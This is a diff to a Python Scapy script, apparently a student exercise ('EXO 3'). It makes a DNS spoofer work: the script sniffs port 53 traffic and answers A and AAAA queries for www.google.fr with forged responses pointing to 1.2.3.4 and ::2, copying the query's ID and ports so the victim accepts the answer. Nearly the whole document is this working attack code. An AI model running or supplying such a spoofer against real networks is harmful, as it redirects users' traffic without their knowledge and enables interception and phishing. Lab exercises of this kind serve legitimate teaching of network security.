@@ -36,20 +36,25 @@ def exo2():
 ################ EXO 3 ###############
 def callback(pkt):
     if DNS in pkt[0] and pkt[DNS].opcode == 0:
+        #requette A
         if pkt[DNSQR].qtype == 1 and pkt[DNSQR].qname[:-1] == "www.google.fr":
-             #spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-             #              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-             #              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-             #              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=42, rdata='1.2.3.4'))
-            #requete type A + www.google.fr
-            spoofed_pkt = IP(dst=pkt[IP].src, src='1.2.3.4', ttl=42)/DNS(opcode=1)/DNSRR(rdata="1.2.3.4")
-            
-            #send(spoofed_pkt)
+            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                          DNS(id=pkt[DNS].id, qr=1,\
+                          an=DNSRR(rrname=pkt[DNS][DNSQR].qname, ttl=42, rdata='1.2.3.4'))
+
+            send(spoofed_pkt, verbose=0)
             print pkt[DNSQR].qname, ' A? => ', spoofed_pkt[DNSRR].rdata
+    #requette AAAA
+    if DNS in pkt[0] and pkt[DNS].opcode == 0:
+        if pkt[DNSQR].qtype == 28 and pkt[DNSQR].qname[:-1] == "www.google.fr":
+            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                          DNS(id=pkt[DNS].id, qr=1,\
+                          an=DNSRR(rrname=pkt[DNS][DNSQR].qname, ttl=42, rdata='::2'))
 
-
-
-
+            send(spoofed_pkt, verbose=0)
+            print pkt[DNSQR].qname, ' AAAA? => ', spoofed_pkt[DNSRR].rdata
 
 
     
@@ -58,7 +63,7 @@ def test(packet):
     print packet[DNSQR].qname
 
 def exo3():
-    sniff(filter="port 53", count=0, prn=callback,timeout=None, iface='eth0')
+    sniff(filter="udp dst port 53", prn=callback)
 
     
 
